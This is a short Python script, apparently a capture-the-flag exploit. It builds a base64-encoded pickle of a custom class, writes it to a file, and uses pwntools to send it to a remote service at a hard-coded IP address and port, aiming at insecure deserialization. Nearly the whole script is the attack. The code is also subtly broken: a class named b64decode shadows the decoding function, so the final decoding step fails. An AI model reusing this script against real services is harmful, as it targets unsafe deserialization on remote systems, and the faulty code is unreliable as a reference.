import pickle
import os
from base64 import b64encode
enc = b64encode

class b64decode:
    def __str__(self):
        return input('>')
a = b64decode()

pickle_data = pickle.dumps(a)
print (len(pickle_data))
d  =enc(pickle_data)
with open("backup.data", "wb") as file:
    file.write(d)

from pwn import *
p = remote('104.248.42.88', 4445)
p.recvuntil(':')
print (d)
p.sendline(d)
p.interactive()

with open('backup.data') as file:
    data = file.read()
    a = pickle.loads(b64decode(data))
    print (a)
